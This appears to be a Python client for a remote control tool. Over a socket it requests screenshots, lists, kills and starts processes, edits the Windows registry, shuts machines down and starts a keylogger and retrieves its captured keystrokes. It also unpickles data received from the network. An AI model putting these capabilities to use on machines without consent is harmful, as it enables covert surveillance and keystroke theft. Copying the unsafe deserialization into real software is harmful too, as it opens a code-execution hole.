import socket
import pickle
from tkinter import EXCEPTION
from boltons import socketutils
from PIL import ImageGrab
import os
import wmi

PORT = 1234

class ClientServices:
    def __init__(self, server):
        self.server = server
        self.client = None
        self.buff = None
        self.DELIM = b'\x00'

    def connectServer(self):
        print('CONNECT SERVER')
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.server, PORT))

        self.buff = socketutils.BufferedSocket(self.client, None)

    # close connection func
    def sendCloseConection(self):
        print('SEND CLOSE SIGNAL')

        self.buff.send('close!F!'.encode())
        try:
            self.client.shutdown(socket.SHUT_RDWR)
            self.client.close()
        finally:
            self.client = None
            self.buff = None
    
    #ping func
    def ping(self):
        self.buff.send('ping!F!'.encode())
        if self.buff.recv_until(self.DELIM).decode() == 'OK':
            return True
        else:
            raise Exception


    # dump func
    def sendDump(self, var):
        dump = pickle.dumps(var)
        dump_size = len(dump)

        self.buff.send(str(dump_size).encode() + self.DELIM)
        self.buff.send(dump)
        print(f'\tSent dump data. Size: {dump_size}')

    def recvDump(self): 
        dump_size = int(self.buff.recv_until(self.DELIM).decode())
        dump = self.buff.recv_size(dump_size)

        print(f'\tReceived dump data, size: {dump_size}')
        return pickle.loads(dump)

    # screenshoot func
    def getScreenShot(self):
        print('REQUEST SCREENSHOT')

        self.buff.send('screenshot!F!'.encode())
        return self.recvDump()


    # process func
    def getProcessList(self):
        print('REQUEST PROCESS LIST')

        self.buff.send('processlist!F!'.encode())
        return self.recvDump()

    def sendKillProcess(self, pid):
        print('SEND KILL PROCESS SIGNAL')

        self.buff.send('killprocess!F!'.encode())
        self.buff.send(pid.encode() + self.DELIM)
        return self.buff.recv_until(self.DELIM).decode()

    def sendStartProcess(self, name):
        print('SEND START PROCESS SIGNAL')

        self.buff.send('startprocess!F!'.encode())
        self.buff.send(name.encode() + self.DELIM)
        return self.buff.recv_until(self.DELIM).decode()


    # app func
    def getAppList(self):
        print('REQUEST APP LIST')

        self.buff.send('applist!F!'.encode())
        return self.recvDump()


    # keylogger func
    def keylogger_Start(self):
        print('REQUEST BEGIN KEYLOGGER')
        self.buff.send('keylogger!F!'.encode())

    def keylogger_CommandHook(self):
        print(f'\tSend keylogger command: hook')
        self.buff.send('hook'.encode() + self.DELIM)

        return self.buff.recv_until(self.DELIM).decode()

    def keylogger_Command(self, cmd):
        print(f'\tSend keylogger command: {cmd}')
        self.buff.send(cmd.encode() + self.DELIM)

    def keylogger_Send(self):
        print('\tRequest keylogger data')
        self.keylogger_Command('send')

        return self.buff.recv_until(self.DELIM).decode()


    # registry func
    def sendRegFile(self, data):
        print('SEND REG FILE')
        self.buff.send('regfile!F!'.encode())
        self.buff.send(data.encode() + self.DELIM)
        
        return self.buff.recv_until(self.DELIM).decode()

    def sendRegGetVal(self, path, val):
        print('SEND GET REG VALUE SIGNAL')
        self.buff.send('reggetval!F!'.encode())
        self.buff.send(path.encode() + self.DELIM)
        self.buff.send(val.encode() + self.DELIM)
        
        return self.recvDump()
    
    def sendRegSetVal(self, path, val, data, type):
        print('SEND SET REG VALUE')
        self.buff.send('regsetval!F!'.encode())
        self.buff.send(path.encode() + self.DELIM)
        self.buff.send(val.encode() + self.DELIM)
        self.buff.send(type.encode() + self.DELIM)
        self.sendDump(data)

        return self.buff.recv_until(self.DELIM).decode()

    def sendRegDeVal(self, path, val):
        print('SEND DELETE REG VALUE')
        self.buff.send('regdelval!F!'.encode())
        self.buff.send(path.encode() + self.DELIM)
        self.buff.send(val.encode() + self.DELIM)

        return self.buff.recv_until(self.DELIM).decode()

    def sendRegCreateKey(self, path):
        print('SEMD CREATE REG KEY')
        self.buff.send('regcreatekey!F!'.encode())
        self.buff.send(path.encode() + self.DELIM)

        return self.buff.recv_until(self.DELIM).decode()

    def sendRegDelKey(self, path):
        print('SEND DELETE REG KEY')
        self.buff.send('regdelkey!F!'.encode())
        self.buff.send(path.encode() + self.DELIM)

        return self.buff.recv_until(self.DELIM).decode()

    # shutdown func
    def sendShutdown(self):
        print('SEND SHUTDOWN SIGNAL')
        self.buff.sendall('shutdown!F!'.encode())